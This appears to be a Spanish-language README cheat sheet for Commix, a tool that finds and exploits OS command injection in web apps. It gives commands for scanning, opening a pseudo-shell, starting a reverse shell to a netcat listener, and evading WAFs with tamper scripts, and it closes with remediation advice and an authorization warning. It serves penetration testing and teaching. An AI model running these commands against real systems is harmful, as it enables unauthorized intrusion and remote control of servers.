<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="centro">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Seguridad web">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licencia GPLv3">
</p>

<p align="centro">
  <b>🌐 Herramienta automatizada diseñada para detectar y explotar vulnerabilidades de inyección de comandos en aplicaciones web y generar shells interactivos</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y primitiva de inyección de comandos](#-descripción general--la-primitiva-de-inyección-de-comandos)
- [Instalación](#-instalación)
- [Escaneo básico de vulnerabilidades](#-escaneo-básico-de-vulnerabilidad)
- [Inyectar diferentes elementos HTTP](#-inyectar-diferentes-elementos-http)
  - [OBTENER parámetros](#get-parameters)
  - [Datos POST (`--data`)](#post-data---datos)
  - [Encabezados HTTP y cookies](#http-headers--cookies)
- [Creación de conchas interactivas y inversas](#-spawning-interactive--conchas-inversas)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Shell inverso nativo (`--reverse-ip`)](#shell-inverso-nativo---ip-inversa)
- [Secuencias de comandos de evasión y manipulación WAF (`--tamper`)] (#-evasión-waf--scripts-tamper---tamper)
- [Técnicas ciegas basadas en archivos y en tiempo](#-basadas en archivos--técnicas ciegas basadas en tiempo)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y remediación](#-consideraciones-defensivas--remediación)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y primitiva de inyección de comandos

Mientras que **SQLMap** automatiza la inyección de SQL, **Commix** (creado por **Anastasios Stasinopoulos**) es el estándar de oro para encontrar y explotar fallas en la **Inyección de comandos del sistema operativo**.

Cuando las aplicaciones web pasan de forma insegura las entradas del usuario directamente a las funciones de ejecución del sistema operativo (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), los atacantes pueden agregar comandos de shell arbitrarios. Commix detecta automáticamente vectores de inyección basados ​​en resultados, basados ​​en salida, basados ​​en tiempo y basados ​​en archivos.

---

## 📥 Instalación
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Escaneo básico de vulnerabilidades
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Inyectar diferentes elementos HTTP

### OBTENER parámetros
Utilice la etiqueta `INJECT_HERE` si existen varios parámetros:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### Datos POST (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### Encabezados HTTP y cookies
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Generación de caparazones interactivos e inversos

### Pseudo-Shell (`--os-shell`)

Cuando se confirma la inyección, Commix proporciona un pseudoterminal emulado directamente dentro de la consola:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Shell inverso nativo (`--reverse-ip`)

Indique a Commix que restablezca una conexión TCP inversa interactiva completa a su oyente Netcat:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 Guiones de evasión y manipulación WAF (`--tamper`)

Evite los firewalls de aplicaciones web (WAF) y las listas negras de cadenas mediante la manipulación de ofuscación incorporada:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Técnicas ciegas basadas en archivos y en tiempo

Cuando la salida no se muestra en la respuesta HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Escanear parámetro GET** | `commix -u "<URL>?param=val"` |
| **Parámetro POST de escaneo** | `commix -u "<URL>" --data="param=val"` |
| **Escaneo por lotes no interactivo** | `commix -u "<URL>" --batch` |
| **Carcasa de terminal interactiva**| `commix -u "<URL>" --os-shell` |
| **Soltar carcasa inversa** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Repetir solicitud de eructar** | `commix -r burp_request.req` |
| **Usar manipulación espacial** | `commix -u "<URL>" --tamper=space2ifs` |
| **Ejecutar comando único** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Consideraciones defensivas y remediación

1. **Evite la ejecución del shell del sistema operativo:** nunca concatene entradas de usuario no desinfectadas en `system()`, `exec()` o comandos de shell.
2. **Utilice API de lenguaje nativo:** Reemplace las utilidades del sistema con bibliotecas de lenguajes de programación nativos (por ejemplo, use la biblioteca `socket` de Python en lugar de ejecutar el binario `ping` del sistema).
3. **Lista blanca estricta:** si la entrada del usuario debe dictar la ejecución del programa, valide la entrada con una lista blanca alfanumérica estricta antes de la invocación.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Commix automatiza la ejecución de comandos arbitrarios en los servidores de destino. La manipulación o explotación de aplicaciones web no autorizadas es ilegal. Úselo únicamente en sistemas donde posea autorización explícita por escrito.